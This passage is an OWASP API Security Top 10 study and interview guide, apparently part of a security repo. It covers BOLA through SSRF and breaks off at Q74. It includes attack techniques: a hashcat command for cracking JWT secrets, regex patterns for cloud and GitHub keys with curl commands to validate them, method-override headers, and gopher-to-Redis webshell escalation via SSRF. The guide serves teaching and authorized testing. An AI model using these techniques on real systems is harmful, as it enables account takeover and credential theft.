# OWASP API Security Top 10 (2023) — Zero to Expert (Q&A, Bug-Bounty / Red-Team / Interview Edition)

> A complete study + field + **interview** reference for the **OWASP API Security Top 10:2023**. **Organized in
> API-Top-10 order** — everything for **API1** (what it is → how to test → red-team escalation → interview questions →
> defense) is together, then **API2**, and so on through **API10**. This is the **umbrella** companion; the concrete
> techniques live in the surface kits (`REST/`, `GraphQL/`) and the per-class Web kits (`../Web/…`). Learn the *risks*
> here; type the *payloads* in the kits.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, own labs. **Two accounts + benign
> markers** is the core method — prove "as user A I reached user B's object/function," clean up, never test what you
> don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- **OWASP API Security Top 10:2023** — official list + per-item pages (API1–API10): https://owasp.org/API-Security/
- **Corey J. Ball — *Hacking APIs*** (No Starch, 2022) — the definitive hands-on API-testing book
- PortSwigger Academy (API/GraphQL/access-control/SSRF labs) · HackTricks (API pentesting) · Burp **Autorize/Autorepeater**, **InQL**, **Param Miner**
- Companion umbrella in this repo: `OWASP_API_TOP_10.md`. Surface kits: `REST/`, `GraphQL/`. Siblings: `../Web/OWASP_WEB_TOP_10.md`, `../Mobile/OWASP_MOBILE_TOP_10.md`, `../AI/LLM/OWASP_LLM_TOP_10.md`.

---

## TABLE OF CONTENTS
- **§0 — The framework itself** (Q1–Q12)
- **§API1 — Broken Object Level Authorization (BOLA)** (Q13–Q24)
- **§API2 — Broken Authentication** (Q25–Q33)
- **§API3 — Broken Object Property Level Authorization (BOPLA)** (Q34–Q42)
- **§API4 — Unrestricted Resource Consumption** (Q43–Q50)
- **§API5 — Broken Function Level Authorization (BFLA)** (Q51–Q59)
- **§API6 — Unrestricted Access to Sensitive Business Flows** (Q60–Q66)
- **§API7 — Server-Side Request Forgery (SSRF)** (Q67–Q74)
- **§API8 — Security Misconfiguration** (Q75–Q82)
- **§API9 — Improper Inventory Management** (Q83–Q90)
- **§API10 — Unsafe Consumption of APIs** (Q91–Q97)
- **§XC — Cross-category chaining & reporting** (Q98–Q104)

> Each `§APIx` block runs in the same order: **Core → How to test → Red-team / escalation → Interview → Prevention.**

---

# §0 — THE FRAMEWORK ITSELF

### Q1. What is the OWASP API Security Top 10 and why does it exist separately from the Web Top 10?
> *Plain version:* the same idea as the Web Top 10, but for **APIs** (the machine doors that apps talk to). It gets its own list because APIs hand out object IDs and admin endpoints directly — so the bugs are mostly "the server forgot to check you're allowed this," not the page-tricking bugs on the web list.

A dedicated **awareness list** for **API-specific** risk (current: **2023**, superseding 2019). It exists separately because APIs fail differently from web pages: they expose **object IDs and privileged functions directly** (no UI to hide behind), so **authorization** — object, function, and property level — dominates the list in a way the Web Top 10 doesn't capture.

### Q2. Name the API Top 10 (2023) in order.
API1 Broken Object Level Authorization (BOLA) · API2 Broken Authentication · API3 Broken Object Property Level Authorization (BOPLA) · API4 Unrestricted Resource Consumption · API5 Broken Function Level Authorization (BFLA) · API6 Unrestricted Access to Sensitive Business Flows · API7 Server-Side Request Forgery · API8 Security Misconfiguration · API9 Improper Inventory Management · API10 Unsafe Consumption of APIs.

### Q3. What changed from the 2019 list to 2023? (interview favorite)
- **BOPLA (API3)** is **new** — it *merges* 2019's "Excessive Data Exposure" + "Mass Assignment" (both are property-level authz).
- **API6 Unrestricted Access to Sensitive Business Flows** is **new** (business-logic-at-scale / automation abuse).
- **API10 Unsafe Consumption of APIs** is **new** (trusting third-party/upstream APIs).
- **Injection** and **Improper Assets Management** were reframed: injection is deprioritized (shared with Web), assets-management became **API9 Improper Inventory Management**.
- "Lack of Resources & Rate Limiting" → **API4 Unrestricted Resource Consumption**.

### Q4. What's the defining theme of the API Top 10?
**Authorization is the whole game.** Three of the top five are authorization failures at different granularities: **API1** (object), **API5** (function), **API3** (property). APIs hand you the IDs and endpoints directly, so the only thing protecting data is a server-side check that's frequently missing.

### Q5. BOLA vs BFLA vs BOPLA — the three-way distinction (asked constantly).
> *Plain version:* three flavours of the same failure — "you weren't checked." **BOLA** = wrong *object* (read someone else's order). **BFLA** = wrong *function* (call an admin-only action). **BOPLA** = wrong *field* (read or set a field you shouldn't, like `isAdmin`). Object → Function → Property. Learn these three and you understand half the list.

- **BOLA (API1)** — *whose object*: swap an object ID → read/modify another user's object.
- **BFLA (API5)** — *which function*: call a privileged/admin function or method you shouldn't.
- **BOPLA (API3)** — *which property*: read fields you shouldn't (over-read) or set fields you shouldn't (mass assignment).
Object → Function → Property. Nail this and you've nailed 60% of the list.

### Q6. Why is BOLA (API1) #1 both in 2019 and 2023?
Because it's the most **common and impactful** API bug: APIs expose object references everywhere (path/query/body/headers), enumeration is trivial, and a single missing per-object check leaks *all* users' data. It's the API twin of the web's #1 (Broken Access Control).

### Q7. What is the master testing technique for the API Top 10?
> *Plain version:* make **two of your own accounts** (A and B), do something as A, then repeat the exact request using B's login aimed at A's stuff. If it works, the server isn't checking ownership — that's the bug. This one trick finds the highest-paying API bugs, and Burp's "Autorize" does it for you automatically.

The **two-account differential**: authenticate as user A and user B; perform each action as A, capture the request, replay it with B's token against A's objects — anything that succeeds is a BOLA/BFLA/BOPLA. Automate with Burp **Autorize** (compares low-priv vs high-priv responses per request).

### Q8. Why don't scanners find most API bugs?
Because BOLA/BFLA/BOPLA/business-flow require **understanding relationships and intent** (whose object, which role, what the flow means) — the requests are individually valid. Scanners find injection/misconfig; humans with two accounts find the authorization and logic bugs that pay.

### Q9. How is the API surface different to *discover* than a web app?
There's no rendered UI mapping the app — the endpoints *are* the app. You enumerate from **docs/OpenAPI/Swagger, JS bundles, mobile-app decompile, traffic capture, and route/param brute** — including **shadow/legacy/internal** endpoints (API9). Discovery is a first-class phase; you can't test what you haven't found.

### Q10. Which API risks are shared with the Web Top 10 vs API-native?
**Shared** (reached via JSON/GraphQL body instead of a form): API7 SSRF, injection in params/resolvers, API2 auth (JWT/OAuth), API8 misconfig (CORS). **API-native** (the list's reason to exist): API1/API3/API5 authorization granularities, API4 resource consumption, API6 business-flow abuse, API9 inventory, API10 unsafe consumption.

### Q11. Which kits own the API work in this repo?
`REST/` (the OWASP-API-Top-10 backbone — API1–API10 hands-on), `GraphQL/` (introspection, node/by-id BOLA, batching→DoS, resolver injection, CSWSH), and the per-class Web kits for the concrete vuln (`../Web/IDOR/` for BOLA/BFLA/mass-assign, `../Web/JWT|OAuth|AccountTakeover/` for auth, `../Web/SSRF/` for API7, `../Web/RaceCondition/` for API4/API6, `../Web/Recon|JSFiles/` for API9).

### Q12. How do REST and GraphQL differ for these risks?
GraphQL concentrates several: **introspection** exposes the whole schema (API9-ish), **`node(id:)`/`*ById`** resolvers are BOLA hotspots, **aliasing/batching** enables API4 DoS + rate-limit/OTP-brute bypass, **over-selection** is API3 over-read, and a single endpoint hides many operations. REST spreads the same risks across many routes/verbs. Method matters, risks are the same.

---

# §API1 — BROKEN OBJECT LEVEL AUTHORIZATION (BOLA)

**Core**

### Q13. What is BOLA?
The API exposes an object identifier (path/query/body/header) and fails to verify the **authenticated caller is authorized for that specific object**. Change the ID → access someone else's object. It's the API name for **IDOR**, and it's **#1** — the most common and impactful API bug. → `../Web/IDOR/`.

### Q14. Why is BOLA so prevalent in APIs specifically?
Because APIs are *built* around object references — `/users/{id}`, `/orders/{id}`, `{"account_id":…}` — and developers often authenticate (is there a valid token?) but forget to **authorize per object** (does this token own *this* object?). The reference is right there in every request.

**How to test**

### Q15. How do you test for BOLA end-to-end?
Two-account differential: as user A, capture a request touching object `A1`; replay with **B's token** against `A1` — blocked? **With Autorize:** load B's (low-priv) auth header, browse the app as A, and read the per-request red/green/orange verdicts. Then swap the ID everywhere it appears — path (`/orders/A1`), query (`?id=A1`), body (`{"order_id":"A1"}`), headers (`X-Account-Id`), nested JSON, GraphQL `node(id:)`/`*ById`. Try the victim's ID, **adjacent** IDs, and **enumerated** ranges. Test **all verbs** (GET disclosure; PUT/PATCH/DELETE tamper/destroy). The clean PoC: "as B, with B's session, I read/modified A's object A1."

### Q16. How do different ID formats change your approach?
- **Numeric/sequential** → increment/enumerate → mass extraction.
- **UUID/random** → not guessable, so **harvest** them elsewhere (other responses, emails, referrers, logs) then replay — a UUID isn't authorization.
- **Hashed/encoded** → decode/re-encode and tamper.
- **Composite keys** → vary each part.
The lesson: unguessable IDs are *not* an access control.

### Q17. What is second-order / multi-step BOLA?
An object ID accepted at **step 2** of a flow that was only checked (or set) against identity at **step 1** — e.g., a cart→checkout flow that trusts a `cart_id` in the final call without re-verifying ownership. Track IDs *across* the flow, not just per request.

**Red-team / escalation**

### Q18. How do you escalate a single-object BOLA to Critical?
Maximize **breadth** (enumerate/iterate → *all* users' objects, not one), **write** (does PUT/PATCH/DELETE also lack the check → modify/destroy), and **sensitivity/tenancy** (PII/payment/health? cross-*tenant* → multi-customer breach). "Read one order" = High; "enumerate + modify every customer's orders" = Critical.

### Q19. How does BOLA chain with API4 (resource consumption)?
BOLA + **no rate limit** (API4) = *automatable mass extraction*: iterate millions of IDs unthrottled → bulk PII/financial exfiltration. The missing rate limit turns a per-object bug into a full-database breach. Note both in the report.

**Interview**

### Q20. "What's the difference between BOLA and BFLA?"
BOLA is **object-level** — *whose* object can I access (swap an ID). BFLA is **function-level** — *which* privileged operation/endpoint can I call (reach admin functions). BOLA = horizontal data access; BFLA = vertical privilege. Both are "authorization not enforced," at different granularities.

### Q21. "You changed `GET /api/v2/users/1337/cards` to `1338` and saw another user's card. Rate it and next steps."
**High→Critical** (BOLA, cross-user payment-data disclosure, CWE-639). Next: confirm with two own accounts; test **enumeration** (all users → mass breach); test **write** verbs; check rate limiting (API4) for scale; report impact-first with the two-account proof. Don't pull real users' data beyond minimal proof.

**Prevention**

### Q22. How is BOLA prevented?
Enforce **per-object authorization on every request** — verify the authenticated principal owns/may access *that specific object*, server-side, at the data layer (e.g., scope every query by the caller's ID). Don't rely on unguessable IDs alone. **Centralize** the check so no endpoint forgets it; test with two-account diffs in CI.

### Q23. Why does "add a random UUID" fail as the fix?
It's obscurity — a UUID leaked in a response/referrer/log/email is still accepted because the server never checks ownership. Random IDs are defense-in-depth; the fix is the ownership check.

### Q24. CWEs for BOLA?
**CWE-639** (Authorization Bypass Through User-Controlled Key), CWE-284, CWE-285, CWE-566 (authz bypass via data manipulation).

### Q24a. How do different ID formats change BOLA exploitation?
- **Sequential/numeric** (`/orders/1338`) → increment/enumerate with Intruder/`ffuf` → mass extraction.
- **UUID/random** → *not* guessable, so **harvest** them elsewhere (other API responses, emails, `Referer`, logs, a list endpoint) and replay — a UUID is *not* authorization (Q23). GraphQL frequently leaks IDs from one query for reuse in another.
- **Hashed/encoded** (`dXNlcjoxMjM=` → `user:123`, or an MD5 of the id) → decode, tamper, re-encode.
- **Composite keys** (`tenant:user:id`) → vary each part, especially the **tenant** (→ cross-tenant breach).

The lesson: unguessable IDs are defence-in-depth, never an access control — the fix is the per-object ownership check. → `../Web/IDOR/`.

---

# §API2 — BROKEN AUTHENTICATION

**Core**

### Q25. What is API2 Broken Authentication?
Weaknesses in **confirming the caller's identity** — the API's auth mechanisms (login, tokens, API keys, session, recovery) are implemented incorrectly, letting attackers assume other identities. Includes weak/leaked API keys, JWT flaws, credential-stuffing exposure (no rate limit/lockout), weak reset flows, token mismanagement.

### Q26. What's the impact ceiling and why is it the #2 gate?
**Account takeover / impersonation** at the identity layer — forge or steal a token → act as any user; brute/stuff with no rate limit → *mass* ATO; a leaked long-lived API key → full backend access. It's #2 because it's the gate: break it and BOLA/BFLA are moot — you're already someone else.

**How to test**

### Q27. What JWT flaws do you test for API2?
`alg:none` (server accepts an unsigned token); **weak/guessable HS256 secret** → crack offline: `hashcat -m 16500 token.txt rockyou.txt` or `jwt_tool -C -d rockyou.txt`, then re-sign `{"role":"admin"}`; **RS256→HS256 confusion** (sign with the *public* key as the HMAC secret); **`kid`/`jku`/`x5u` injection** (point verification at your key/JWKS); **missing signature verification**; **no/`exp` too long**; **claim tampering** (`sub`/`role`/`tenant`). Read/tamper with `jwt_tool <token>`. Any → forge → impersonate. → `../Web/JWT/`.

### Q28. How do you test API keys and OAuth for API2?
**API keys**: leaked in JS/mobile/repos? long-lived? least-privilege? revocable? (recover one → test its reach → `../Web/JSFiles/`). **OAuth/OIDC/SSO**: `redirect_uri` bypass, missing `state`, code replay, PKCE downgrade, `id_token` forgery. → `../Web/OAuth/`. Also: any endpoint that skips auth entirely?

### Q29. How does credential stuffing tie API2 to API4?
API2's weakness is *accepting* weak/stuffed credentials; API4's missing **rate limiting** is what makes stuffing/OTP-brute *feasible at scale*. No lockout + no rate limit on `/login` or `/mfa` → automated mass ATO. Always test auth endpoints for rate limiting.

**Red-team / escalation**

### Q30. How does a leaked API key become full compromise?
Validate the key against the backend/cloud/third-party → if it's a **god-key** (broad scope, no expiry) it grants data access, billing abuse, or admin operations directly. Pull keys from mobile-app decompile or JS bundles, confirm reach, and report the concrete access (not just "a key was present").

**Interview**

### Q31. "How would you secure API authentication?"
Standard vetted mechanisms (don't roll your own); strong JWT validation (verify signature + `alg` + `exp` + `aud`/`iss`, no `none`); **rate limiting + lockout + MFA** on auth/OTP/reset; short-lived, revocable, rotated tokens; scoped revocable API keys never embedded as client secrets; authenticate *every* non-public endpoint.

### Q32. "Where should an API token live in a request, and why not the URL?"
In the **`Authorization` header** (`Bearer <token>`). Not the URL/query string — URLs land in server logs, browser history, referrer headers, and proxies, leaking the token. Header-based transport keeps it out of those sinks.

**Prevention**

### Q33. Prevention + CWEs for API2?
See Q31; plus secure recovery flows (host-independent reset links, strong tokens) and server-side token revocation on logout + refresh rotation. CWEs: **CWE-287** (improper authentication), CWE-307 (no brute-force restriction), CWE-798 (hardcoded creds), CWE-345 (insufficient verification), CWE-640 (weak reset).

### Q33a. How do you hunt and validate leaked API keys (API2)?
**Find** them in JS bundles, mobile-app decompiles, public git repos, `.env`/config exposures, and error messages — grep patterns: `AKIA[0-9A-Z]{16}` (AWS), `AIza[0-9A-Za-z_\-]{35}` (Google), `ghp_[0-9A-Za-z]{36}` (GitHub PAT), `sk_live_[0-9a-zA-Z]{24,}` (Stripe), `xox[baprs]-` (Slack). **Validate read-only** (proof, no abuse): AWS `aws sts get-caller-identity`, GitHub `curl -H 'Authorization: token <k>' api.github.com/user`, Stripe `curl -u <k>: api.stripe.com/v1/balance`, Slack `auth.test`. A **god-key** (broad scope, no expiry) is High/Critical — report the concrete access it grants, not just "a key was present." → `../Web/JSFiles/`.

---

# §API3 — BROKEN OBJECT PROPERTY LEVEL AUTHORIZATION (BOPLA)

**Core**

### Q34. What is BOPLA and what two 2019 items did it merge?
> *Plain version:* the API checks *which object* you can touch but not *which fields* of it — so it either **shows** you fields it shouldn't (a password hash) or **lets you set** fields it shouldn't (`"isAdmin":true`). Two old 2019 bugs ("too much data out" + "too much data in") rolled into one.

Failure to authorize at the **property (field) level** — merging 2019's **Excessive Data Exposure** (over-**read**: the response returns fields the caller shouldn't see) and **Mass Assignment** (over-**write**: the caller can *set* fields they shouldn't). Same root: no per-property authorization.

### Q35. Give the two directions with concrete examples.
- **Over-read**: `GET /users/me` returns the full object including `password_hash`, `isAdmin`, other users' internal fields — the UI hides them but the API sent them.
- **Over-write (mass assignment)**: `PATCH /users/me` with `{"role":"admin"}` or `{"balance":99999}` gets persisted because the server binds the whole body to the model.

**How to test**

### Q36. How do you test for mass assignment (over-write)?
Learn the object's full schema (from a GET response / docs / mobile app), then **add unexpected properties** to create/update bodies: `{"role":"admin"}`, `{"isAdmin":true}`, `{"verified":true}`, `{"price":0}`, `{"user_id":<other>}`, `{"status":"approved"}`. Confirm **persistence** with a follow-up read. Try nested/array forms. → `../Web/IDOR/` (massassign method).

### Q37. How do you test for excessive data exposure (over-read)?
Inspect **full raw responses** (not the rendered UI): does the object include hashes, PII, internal IDs, tokens, flags, or *other users'* data? Compare a low-priv caller's response to an admin's — same fat object? In GraphQL, introspect and **request sensitive fields directly** (over-selection). → `GraphQL/`.

**Red-team / escalation**

### Q38. Why is mass assignment often an instant Critical?
Because setting one property can flip authorization: `isAdmin:true`/`role:admin` → **privilege escalation to admin**; `price:0`/`discount:100` → financial; `verified:true`/`approved:true` → state forgery; `user_id:<victim>` → assign your action to another account. One extra JSON field, full compromise.

### Q39. How does BOPLA chain with BOLA/BFLA?
Over-read (BOPLA) leaks IDs/tokens/fields → fuel **BOLA** (now you have victim object IDs) or **BFLA** (you learned admin field/endpoint names). Mass-assign `user_id` blends into **BOLA** (act on another's object). Property, object, and function bugs feed each other.

**Interview**

### Q40. "What is mass assignment and how do you prevent it?"
The framework auto-binds *all* request-body fields to the data model, so a client can set fields it shouldn't (`isAdmin`). Prevent with an explicit **allow-list of writable properties** per endpoint/role (bind only permitted fields — never `Model.update(req.body)`), plus DTOs/strong parameters.

### Q41. "An API returns a user object with `password_hash` and `2fa_secret`, but the UI never shows them. Bug?"
Yes — **API3 excessive data exposure**. The API must not return fields the caller isn't authorized to see; client-side hiding is not access control. Impact depends on the field (hashes → offline cracking; 2FA secret → MFA bypass; other users' PII → breach). Fix: serialize per-role with an allow-list.

**Prevention**

### Q42. Prevention + CWEs for API3?
Explicit **writable-property allow-list** per role/endpoint (over-write) *and* explicit **returned-property allow-list** / DTO per role (over-read) — never bind or return the raw object and filter client-side; validate the caller may read/write *each* field; GraphQL field-level authorization. CWEs: CWE-915 (mass assignment), CWE-213 (intentional info exposure), CWE-282, CWE-639.

### Q42a. What signals an over-read (excessive data exposure), and how do you prove it?
Inspect the **raw API response** (not the rendered UI) for fields the client should never receive: `password`/`password_hash`, `mfa_secret`/`totp_seed`, `ssn`/`dob`/full PAN, internal flags (`is_admin`, `credit_limit`), other users' data inside a list, API keys/tokens, internal IDs/paths. Compare a **low-priv** caller's response to an **admin's** — same fat object = the API dumps everything and relies on client-side hiding. In GraphQL, **introspect** and request the sensitive fields directly (over-selection). Proof = "the API returned `password_hash` / another user's PII that the UI hides" → rate by the field (hashes → offline cracking; 2FA seed → MFA bypass; PII → breach). CWE-213. → `GraphQL/`, `REST/`.

---

# §API4 — UNRESTRICTED RESOURCE CONSUMPTION

**Core**

### Q43. What is API4?
> *Plain version:* the API never says "that's enough." No limit on how fast, how big, or how expensive your requests are — so you can crash it, run up its cloud bill, or brute-force passwords because nothing stops you trying forever.

Serving requests **without limiting resource use** — no rate limits, no request/response-size caps, no query-complexity limits, no quotas/spend caps — so a client can drive excessive CPU/memory/bandwidth/storage/third-party-cost. Formerly "Lack of Resources & Rate Limiting."

### Q44. What are the three impact flavors?
**DoS** (resource exhaustion downs the service), **denial-of-wallet** (each request costs money — third-party calls, SMS/email, compute — unbounded = unbounded bill), and — often overlooked — **enabler** for API1/API2 attacks (BOLA enumeration, credential stuffing, OTP/token brute all need volume).

**How to test**

### Q45. How do you test for API4?
Hammer an endpoint → is there a per-user/IP **rate limit** (and does it key on something you can rotate — IP, a resettable header)? Send **huge payloads** / huge pagination (`?limit=99999999`, `page_size`) / unbounded **batch/bulk** operations. Trigger **amplification** — deep GraphQL nesting, **aliased/batched** queries (one request → thousands of ops), expensive filters/sorts/exports/report-gen. Hit **cost-driving** actions (SMS/email/paid third-party/LLM) and quantify **$/request × achievable rate** ("$0.05/SMS × 100 req/s unthrottled = $18k/hr"). → `../Web/RaceCondition/` (rate-limit method), `GraphQL/` (complexity).

### Q46. What GraphQL-specific API4 attacks exist?
**Deeply nested** queries (recursive relationships), **aliasing** (`a: field … z: field` — many ops in one query), **batching** (array of queries in one request → also bypasses per-request rate limits / OTP throttles), and `@defer`/`@stream` abuse. One request → thousands of resolver executions. → `GraphQL/`.

**Red-team / escalation**

### Q47. How is "no rate limit" more than just DoS?
It's the **force multiplier** for the whole list: unthrottled `/login` → credential stuffing → mass ATO (API2); unthrottled `/mfa` → OTP brute → 2FA bypass; unthrottled `/users/{id}` → BOLA mass extraction (API1). Report the missing limit *plus* the attack it enables — that's what elevates it from Low to High.

### Q48. What is denial-of-wallet and how do you quantify it?
An attacker drives cost, not downtime: each request triggers a paid operation (SMS/email/LLM/compute/third-party API). Quantify **$/request × achievable rate × duration** = the financial impact for the report (e.g., "$0.05/SMS × 100 req/s unthrottled = $18k/hour"). Cloud-metered apps are especially exposed.

**Interview**

### Q49. "How would you rate-limit an API properly?"
Per-user/per-key/per-IP limits with sensible windows; stricter limits on expensive/auth/cost-driving endpoints; **cap request/response size, page size, array/batch length**; **query-complexity + depth limits for GraphQL**; timeouts + resource ceilings; spend caps / cost circuit-breakers; throttle + alert on anomalies. Return `429` with `Retry-After`.

**Prevention**

### Q50. Prevention + CWEs for API4?
See Q49. CWEs: CWE-770 (allocation without limits), CWE-400 (uncontrolled resource consumption), CWE-799 (improper control of interaction frequency), CWE-307 (for the auth-brute angle).

### Q50a. What GraphQL-specific API4 attacks exist (and how do they bypass *other* controls)?
- **Deeply nested queries** on recursive relationships (`posts{author{posts{author{…}}}}`) → exponential resolver work → DoS.
- **Aliasing** — request the same field hundreds of times under different aliases in one query (`a: login(...) b: login(...) …`) → many operations in one HTTP request.
- **Batching** — send an *array* of queries/mutations in one request. This doesn't just DoS: it **bypasses per-request rate limits and OTP/2FA throttles** — one HTTP request can carry 10,000 OTP guesses, defeating "5 attempts per request." Test it against `verifyOtp`/`login`.
- **`@defer`/`@stream`** abuse (modern GraphQL) → resource amplification.

Mitigate with query-depth + complexity limits and per-**operation** (not per-request) rate limiting. → `GraphQL/`.

---

# §API5 — BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)

**Core**

### Q51. What is BFLA?
Failure to enforce authorization on **functions/operations** — a user invokes endpoints or actions **above their privilege** (admin/other-role functions) or uses **HTTP methods** they shouldn't. Where BOLA is "whose object," BFLA is "which function." Includes reaching admin/internal endpoints and **verb/method tampering**.

### Q52. What's the impact ceiling?
**Privilege escalation / admin takeover**: call `/api/admin/*`, `/users/{id}/promote`, `/internal/*` as a low-priv (or unauthenticated) user → create admins, change roles, delete data, access management → full application compromise. No UI hides the endpoint; if the server skips the role check, you're in.

**How to test**

### Q53. How do you test for BFLA?
Enumerate admin/management/internal routes (`/admin`, `/manage`, `/v1/users/{id}/role`, `/internal`) → call with a **normal-user token**; role checked server-side? Guess by pattern (if GET `/users/{id}` exists, try POST/PUT/DELETE and `/users`, `/users/{id}/promote`). Test **HTTP method tampering** (GET↔POST↔PUT↔DELETE, `X-HTTP-Method-Override`/`_method`). Cross-role (user→moderator→admin). → `../Web/IDOR/`, `REST/`.

### Q54. What is HTTP verb/method tampering and why does it work?
A control scoped to one method (e.g., "block DELETE on `/users`") is bypassed by using a different verb or a method-override header (`X-HTTP-Method-Override: DELETE`, `_method=DELETE`) that the framework honors but the control didn't cover. Treat **every method on a route as separately authorized**.

**Red-team / escalation**

### Q55. How do you escalate a BFLA to takeover?
Find a privileged function callable by a low-priv user — e.g., `POST /api/users` (create) or `PUT /users/{id}/role` (promote) → **create your own admin** or promote your account → full admin → then everything (config, other users, data). Chain: BFLA → admin → stored XSS/RCE in admin tooling.

### Q56. How does BFLA appear in GraphQL?
Privileged **mutations** (`deleteUser`, `setRole`, `adminUpdateX`) callable by a low-priv session, and admin **queries** exposed without role checks. Introspect the schema → enumerate mutations → call the privileged ones as a normal user. → `GraphQL/`.

**Interview**

### Q57. "How is BFLA different from BOLA, in one sentence each?"
**BFLA**: I can call a *function/endpoint* my role shouldn't allow (vertical privilege). **BOLA**: I can access another *user's object* my role *does* allow me to handle in general, but not *that specific instance* (horizontal). Function vs object.

### Q58. "You can call `POST /api/admin/promote` as a regular user. Severity?"
**Critical** (BFLA → privilege escalation → likely full admin takeover, CWE-285). Prove by promoting a *second own account*, confirm elevated capability, restore it, and report impact-first. This is top-tier because it grants administrative control, not just data.

**Prevention**

### Q59. Prevention + CWEs for BFLA?
Deny by default; enforce **function/role authorization server-side on every endpoint and every method** (centralized, not per-controller ad-hoc); explicitly check role/permission for privileged ops; treat each HTTP method as separately authorized; audit admin/internal routes for external reachability. CWEs: **CWE-285** (improper authorization), CWE-862 (missing authorization), CWE-863.

### Q59a. Give the verb/method-tampering payloads for BFLA.
When a control is scoped to one HTTP method, try the others: if `GET /users/{id}` is allowed but `DELETE` is blocked at the gateway, retry the privileged action as **POST/PUT/PATCH/DELETE**, or smuggle the verb past a method-scoped filter with an **override header** — `X-HTTP-Method-Override: DELETE`, `X-HTTP-Method: PUT`, `X-Method-Override: DELETE`, or a `_method=DELETE` body/query param (Rails/Symfony/Laravel honour these). Also try **case/format** (`Post` vs `POST`) and **HEAD** (often skips auth but leaks existence/headers). Treat *every method on a route as separately authorized*. → `REST/`, `../Web/IDOR/`.

---

# §API6 — UNRESTRICTED ACCESS TO SENSITIVE BUSINESS FLOWS

**Core**

### Q60. What is API6 (new in 2023)?
> *Plain version:* every request is legit — the abuse is doing it **at bot-scale**. Buy all the concert tickets to scalp them, farm a signup bonus with thousands of fake accounts. Nothing's "hacked"; the flow just has no brakes against automation.

Exposing a **sensitive business flow** (purchase, booking, comment/review, referral, vote, ticket-buy, withdrawal) **without compensating for automated/excessive use**. Individual requests are all valid, but the *flow* can be abused at scale to harm the business. It's "business logic at scale" — a *missing anti-automation/design* control, not a broken request.

### Q61. How is API6 different from API4?
**API4** is about *resource/cost* exhaustion (technical: CPU, money, bandwidth). **API6** is about *business* harm from abusing a legitimate flow at scale (scalping, reward farming, review manipulation) — the resource isn't exhausted, the *business logic* is gamed. Both involve automation; the harm differs.

**How to test**

### Q62. How do you test for API6?
Identify sensitive flows (checkout, signup/referral, review, withdrawal, limited-stock buy, coupon redemption); **automate** the flow — can you run it hundreds of times, in parallel, from one/many accounts, faster than a human? Are there anti-automation controls (CAPTCHA, device/velocity checks, per-user caps)? Then **scale the abuse** (buy all stock; farm referrals; stack promos). Race one-per-user limits → `../Web/RaceCondition/`.

**Red-team / escalation**

### Q63. Give concrete API6 abuse scenarios and their impact.
**Scalping/hoarding** (bots buy all limited stock → resale, denial-of-business); **inventory DoS** (reserve everything, never pay); **referral/coupon/loyalty farming** (mass-create accounts → drain rewards); **review/vote manipulation**; **gift-card/credit draining**. Impact is real money/reputation — severity is context-driven but often High.

**Interview**

### Q64. "The API lets one script buy 10,000 concert tickets in seconds. Which OWASP API risk?"
**API6 — Unrestricted Access to Sensitive Business Flows.** The purchase flow lacks anti-automation (velocity limits, device attestation, CAPTCHA, per-user caps), so bots abuse a legitimate flow at scale (scalping). Not injection, not BOLA — a design/anti-automation gap.

### Q65. "Isn't that just 'no rate limit' (API4)?"
Related but distinct: rate limiting helps, but API6 is broader — even with basic rate limits, distributed bots across many accounts/IPs can abuse the *flow*. The fix is **flow-aware anti-automation** (device fingerprinting, behavioral/velocity checks, business caps), not just per-endpoint throttling.

**Prevention**

### Q66. Prevention + CWEs for API6?
Identify sensitive flows and add **anti-automation** proportionate to risk: device fingerprinting/attestation, CAPTCHA/challenge on abuse signals, per-user/per-payment-method/per-device velocity limits + quotas, human review for anomalies, business-rule enforcement (one-per-customer, hold-then-confirm). CWEs: CWE-799 (frequency), CWE-770, CWE-837 (one-instance-per-entity).

---

# §API7 — SERVER-SIDE REQUEST FORGERY (SSRF)

**Core**

### Q67. What is API7 SSRF and why are APIs especially prone?
The API **fetches a client-supplied URI without validating it**, so the server sends requests to attacker-chosen destinations. APIs are prone because features constantly fetch URLs: **webhooks, import-from-URL, URL previews, file/image fetch-by-URL, SSO/OIDC metadata & JWKS, PDF/screenshot generators, integrations**. → `../Web/SSRF/`.

### Q68. What's the impact ceiling?
**Cloud takeover**: SSRF → `169.254.169.254` metadata → **IAM credentials** → assume role → cloud account takeover/RCE; or → internal services (admin/Redis/ES/DB/internal APIs) → RCE/lateral; internal port scan; blind → OOB → chain. Capital One is the canonical breach.

**How to test**

### Q69. How do you find and confirm SSRF in an API?
Find server-fetch sinks (`webhook_url`, `callback`, `image_url`, `import_url`, `avatar`, `?url=`, SSO metadata/JWKS, XML→XXE). Point them at metadata/localhost/internal → creds/internal responses. For **blind**, use an **OOB** listener (Collaborator/`interactsh`) — a DNS/HTTP callback confirms the fetch. **Escalate blind → RCE** via `gopher://` to an internal service (Redis `CONFIG SET dir`/`dbfilename` + `SAVE` → webshell). Webhooks are the richest API SSRF sink — register one pointing at `169.254.169.254` and read what returns. → `../Web/SSRF/`.

### Q70. How do you bypass SSRF filters/allow-lists?
DNS **rebinding**; **redirect-to-internal** (open redirect on an allowed host — → `../Web/OpenRedirect/`); IP encodings (decimal/hex/octal); IPv6; userinfo (`http://allowed@169.254.169.254/`); alternate schemes (`gopher://`/`dict://`/`file://`); validator-vs-fetcher parser differences.

**Red-team / escalation**

### Q71. How does blind SSRF reach RCE?
`gopher://` smuggles arbitrary bytes to internal TCP services: hit internal **Redis** (`SET`/`CONFIG`/`SAVE` → webshell or cron), unauthenticated internal APIs, or DB protocols → internal RCE/lateral. Confirm reachability via OOB first, then craft the protocol payload. → `../Web/SSRF/`.

**Interview**

### Q72. "How is SSRF via a webhook different from a normal web SSRF?"
Mechanically the same (server fetches your URL), but webhooks are a *designed* URL-fetch feature, so they're a rich, often-overlooked API SSRF sink — the app *intends* to call your URL, so the temptation is to skip validation. Register a webhook to `169.254.169.254`/internal and see what comes back (or use OOB for blind).

### Q73. "When is it SSRF vs open redirect?"
SSRF = the **server** makes the request (you reach internal/metadata). Open redirect = the server tells the **browser** to navigate somewhere (client-side, phishing/OAuth-token theft). If nothing server-side fetches your URL, it's not SSRF. → `../Web/OpenRedirect/` is the sibling.

**Prevention**

### Q74. Prevention + CWE for API7?
